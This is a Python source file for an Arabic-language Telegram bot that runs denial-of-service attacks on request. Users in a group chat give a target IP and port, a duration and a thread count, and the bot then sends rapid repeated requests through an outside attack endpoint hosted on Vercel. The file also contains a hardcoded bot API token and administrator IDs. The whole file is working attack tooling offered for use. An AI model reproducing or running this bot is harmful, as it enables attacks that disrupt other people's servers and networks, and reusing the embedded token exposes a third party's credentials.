import requests
import time
import threading
import concurrent.futures
import telebot
from telebot import types
from datetime import datetime

# متغيرات لتتبع حالة الهجوم لكل مستخدم
user_attacks = {}

# قائمة بالمشرفين (يمكن إضافة معرفاتهم هنا)
ADMIN_IDS =  [6936867370, 5590831883]  # استبدل بمعرفات المشرفين الفعلية

def send_requests(url, user_id):
    while user_attacks.get(user_id, {}).get('attack_running', False):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"Request sent to {url} by user {user_id}")
            else:
                print(f"Failed to send request to {url} by user {user_id}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e} by user {user_id}")
        time.sleep(0.01)

def start_attack(ip_port, duration, user_id, num_threads=10):
    user_attacks[user_id] = {
        'attack_running': True,
        'ip_port': ip_port,
        'duration': duration,
        'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'num_threads': num_threads
    }

    ip, port = ip_port.split(':')
    port = int(port)
    
    # استخدام الرابط الجديد من مشروع Vercel
    url = f'https://ping-docs-attack-fadai-rdp.vercel.app/send?ip={ip}&port={port}'
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_requests, url, user_id) for _ in range(num_threads)]
        
        time.sleep(duration)
        user_attacks[user_id]['attack_running'] = False
        
        for future in concurrent.futures.as_completed(futures):
            future.result()

# معرف التوكن الخاص بالبوت
API_TOKEN = '7711327868:AAE06zWPfYRCFn0Zlh8xx_k-fYf1ZYWub1w'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start_attack'])
def start_attack_command(message):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        return

    user_id = message.from_user.id
    if user_attacks.get(user_id, {}).get('attack_running', False):
        bot.reply_to(message, "لقد قمت بالفعل بتشغيل هجوم. لا يمكنك بدء هجوم آخر قبل إيقاف الهجوم الحالي.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "الرجاء إدخال الأمر بالشكل الصحيح: /start_attack <IP:Port>")
        return

    ip_port = command_parts[1]
    bot.reply_to(message, "الرجاء إدخال مدة الهجوم بالثواني:")
    
    bot.register_next_step_handler(message, process_duration, ip_port)

def process_duration(message, ip_port):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        return

    try:
        duration = int(message.text)
        user_id = message.from_user.id
        
        # التحقق من صلاحية المستخدم (مشرف أم لا)
        if user_id in ADMIN_IDS:
            bot.reply_to(message, "الرجاء إدخال عدد الخيوط (Threads):")
            bot.register_next_step_handler(message, process_threads, ip_port, duration, user_id)
        else:
            num_threads = 7  # المستخدم العادي يستخدم 7 خيوط فقط
            start_attack_thread(ip_port, duration, user_id, num_threads, message)
        
    except ValueError:
        bot.reply_to(message, "الرجاء إدخال مدة صالحة بالثواني.")

def process_threads(message, ip_port, duration, user_id):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        return

    try:
        num_threads = int(message.text)
        if num_threads <= 0:
            bot.reply_to(message, "عدد الخيوط يجب أن يكون أكبر من الصفر.")
            return
        
        start_attack_thread(ip_port, duration, user_id, num_threads, message)
        
    except ValueError:
        bot.reply_to(message, "الرجاء إدخال عدد خيوط صالح.")

def start_attack_thread(ip_port, duration, user_id, num_threads, message):
    user_attacks[user_id] = {'ip_port': ip_port, 'duration': duration, 'num_threads': num_threads}
    
    # تفاصيل الهجوم مع رموز تعبيرية
    attack_details = (
        f"🎯 *تفاصيل الهجوم:*\n"
        f"👤 *المستخدم:* {message.from_user.first_name}\n"
        f"📌 *الهدف:* {ip_port}\n"
        f"⏳ *المدة:* {duration} ثانية\n"
        f"🧵 *عدد الخيوط:* {num_threads}\n"
        f"⏰ *وقت البدء:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    markup = types.ReplyKeyboardMarkup(row_width=2)
    stop_button = types.KeyboardButton('إيقاف الهجوم')
    repeat_button = types.KeyboardButton('تكرار الهجوم')
    markup.add(stop_button, repeat_button)
    bot.send_message(message.chat.id, attack_details, reply_markup=markup)
    
    attack_thread = threading.Thread(target=start_attack, args=(ip_port, duration, user_id, num_threads))
    attack_thread.start()

@bot.message_handler(func=lambda message: message.text == 'إيقاف الهجوم')
def stop_attack(message):
    user_id = message.from_user.id
    if user_attacks.get(user_id, {}).get('attack_running', False):
        user_attacks[user_id]['attack_running'] = False
        bot.reply_to(message, "تم إيقاف الهجوم.")
    else:
        bot.reply_to(message, "لا يوجد هجوم قيد التشغيل.")

@bot.message_handler(func=lambda message: message.text == 'تكرار الهجوم')
def repeat_attack(message):
    user_id = message.from_user.id
    if user_id not in user_attacks or not user_attacks[user_id]:
        bot.reply_to(message, "لا يوجد هجوم سابق لتكراره.")
        return
    
    ip_port = user_attacks[user_id]['ip_port']
    duration = user_attacks[user_id]['duration']
    num_threads = user_attacks[user_id].get('num_threads', 10)  # استخدام القيمة الافتراضية إذا لم يتم تحديدها
    
    start_attack_thread(ip_port, duration, user_id, num_threads, message)

# بدء تشغيل البوت
bot.polling()
